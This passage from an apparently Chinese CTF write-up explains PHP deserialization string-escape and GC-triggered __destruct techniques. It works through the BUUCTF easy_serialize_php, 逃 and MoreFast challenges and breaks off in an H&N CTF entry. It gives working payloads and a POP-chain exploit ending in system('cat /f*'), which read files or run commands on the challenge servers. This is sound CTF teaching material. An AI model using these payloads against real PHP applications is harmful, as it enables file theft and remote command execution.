<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">58</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
<p>而序列化的时候，当内容被过滤为空时，会向后检查过滤掉字符的个数（这里是8）是否符合序列化条件，比如这里之后的<code>;s:58:&quot;&quot;</code>，又以 ; 结尾，正好满足规则，所以学历化结果就是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;s:117:&quot;</span>a:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">58</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;&quot;</span>;<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
<p>发现成功变成了<code>s:8:&quot;&quot;;s:58:&quot;&quot;;</code></p>
<h4 id="BUUCTF在线评测-easy-serialize-php"><a href="#BUUCTF在线评测-easy-serialize-php" class="headerlink" title="BUUCTF在线评测 easy_serialize_php"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[安洵杯 2019]easy_serialize_php">BUUCTF在线评测</a> easy_serialize_php</h4><p>现在来看题目源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们只能控制fuction里的值，但是不能控制img里的值，（<strong>因为$_SESSION[‘img’]赋值是在extract()变量覆盖的后面执行的）</strong>然而我们这样让他过滤了之后，就可以间接控制到img对应的值。</p>
<p>E.g:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;添加属性img前&quot;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;phpflag&#x27;</span>]=<span class="string">&#x27;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>( <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;添加属性img后&quot;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//string(76) &quot;a:1:&#123;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//string(114) &quot;a:2:&#123;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
<p>此时第二段中第一个}之后并未被丢弃，但是过滤之后：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># echo &quot;添加属性img前&quot;;</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;phpflag&#x27;</span>]=<span class="string">&#x27;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment"># var_dump( serialize($_SESSION));</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># echo &quot;添加属性img后&quot;;</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line"><span class="comment"># var_dump(serialize($_SESSION));</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;没有黑名单过滤的反序列化后&quot;</span>;</span><br><span class="line"><span class="variable">$test</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$test</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>; <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>; <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>; <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>; <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;有黑名单过滤的反序列化后&quot;</span>;</span><br><span class="line"><span class="variable">$test</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$test</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">//没有黑名单过滤的反序列化后array(2) &#123; [&quot;phpflag&quot;]=&gt; string(48) &quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot; [&quot;img&quot;]=&gt; string(20) &quot;Z3Vlc3RfaW1nLnBuZw==&quot; &#125;</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">//有黑名单过滤的反序列化后array(2) &#123; [&quot;&quot;;s:48:&quot;]=&gt; string(1) &quot;1&quot; [&quot;img&quot;]=&gt; string(20) &quot;ZDBnM19mMWFnLnBocA==&quot; &#125;</span></span><br></pre></td></tr></table></figure>
<p>发现}之后的就被舍弃了，留下了我们想要他读取的img值</p>
<p>所以最终 <strong>payload：</strong></p>
<p>GET：?f=show_image</p>
<p>POST：_SESSION[‘flagflag’]=”;s:3:”aaa”;s:3:”img”;s:20:”L2QwZzNfZmxsbGxsbGFn”;}</p>
<p>上面image的值仅供参考</p>
<p><strong>总结思想</strong>，其实就是利用过滤机制：</p>
<p>键1（过滤）：值1 -&gt; new键1</p>
<p>键2 -&gt;  new值1</p>
<p>值2（含构造的img）-&gt; 键[‘img’] 然后后面跟上你要他访问的</p>
<p>原本的img因为成为多余字符了所以被丢弃</p>
<h4 id="BUUCTF在线评测-逃"><a href="#BUUCTF在线评测-逃" class="headerlink" title="BUUCTF在线评测 逃"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[NewStarCTF 2023 公开赛道]逃">BUUCTF在线评测</a> 逃</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;bad&quot;</span>,<span class="string">&quot;good&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">GetFlag</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]))));</span><br></pre></td></tr></table></figure>
<p>发现只能对key进行赋值，也是想到反序列化逃逸，但是我想不到（）</p>
<p>然后我们看 s:9:”cat /flag”;} 和 s:6:”whoami”;}</p>
<p>传入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span> = <span class="string">&quot;\&quot;;s:3:\&quot;cmd\&quot;;s:9:\&quot;cat /flag\&quot;;&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">GetFlag</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>变为:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">&quot;GetFlag&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;s:<span class="number">29</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;cmd&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;cat /flag&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>cmd<span class="string">&quot;;s:6:&quot;</span>whoami<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
<p>这样的话被挤掉的 “;s:3:”cmd”;s:6:”whoami”;} 就有26个，然后whoami跟cat /flag比起来少了3个，那么我们就需要替换掉29个，即需要29个bad</p>
<p>所以payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;cmd&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;cat /flag&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="GC回收机制"><a href="#GC回收机制" class="headerlink" title="GC回收机制"></a>GC回收机制</h3><p>然后一般中在题目中遇到以下，就可以利用GC回收机制来做：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">throw new Exception(&quot;What are you dong ?&quot;);</span><br></pre></td></tr></table></figure>
<p>在PHP中，使用引用计数和回收周期来自动管理内存对象的，当一个变量被设置为NULL，或者没有任何指针指向时，它就会被变成垃圾，被GC机制自动回收掉那么这里的话我们就可以理解为，当一个对象没有被引用时，就会被GC机制回收，在回收的过程中，它会自动触发_destruct方法，而这也就是我们绕过抛出异常的关键点。</p>
<p>也就是在最后序列化前进行 <code>$A=array($a,NULL);</code></p>
<h4 id="BUUCTF在线评测-MoreFast"><a href="#BUUCTF在线评测-MoreFast" class="headerlink" title="BUUCTF在线评测 MoreFast"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[NewStarCTF 2023 公开赛道]More Fast">BUUCTF在线评测</a> MoreFast</h4><p>POP链：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Start.__destruct() --&gt; Crypto.__toString() --&gt; Reverse.__get() --&gt; Pwn.__invoke() --&gt; Web.evil() </span><br></pre></td></tr></table></figure>
<p>EXP：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;  <span class="comment">// 5 Crypto</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;   <span class="comment">// 2 Web</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;  <span class="comment">// 3 Pwn</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>; <span class="comment">// 1 system</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;  <span class="comment">// 1 cat /f*</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;  <span class="comment">// 4 Reverse</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;good job but nothing&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$w</span> = <span class="keyword">new</span> <span class="title class_">Web</span>();</span><br><span class="line"><span class="variable">$w</span>-&gt;func = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$w</span>-&gt;<span class="keyword">var</span> = <span class="string">&#x27;cat /f*&#x27;</span>;</span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">Pwn</span>();</span><br><span class="line"><span class="variable">$p</span>-&gt;obj = <span class="variable">$w</span>;</span><br><span class="line"><span class="variable">$r</span> = <span class="keyword">new</span> <span class="title class_">Reverse</span>();</span><br><span class="line"><span class="variable">$r</span>-&gt;func = <span class="variable">$p</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Crypto</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;obj = <span class="variable">$r</span>;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$s</span>-&gt;errMsg = <span class="variable">$c</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">array</span>(<span class="variable">$s</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>); </span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="2025H-amp-NCTF-2025H-amp-N-CTF-ez-php"><a href="#2025H-amp-NCTF-2025H-amp-N-CTF-ez-php" class="headerlink" title="2025H&amp;NCTF - 2025H&amp;N::CTF ez_php"></a><a target="_blank" rel="noopener" href="https://2025hnctf.huhstsec.top/games/2/challenges#9-ez_php">2025H&amp;NCTF - 2025H&amp;N::CTF</a> ez_php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 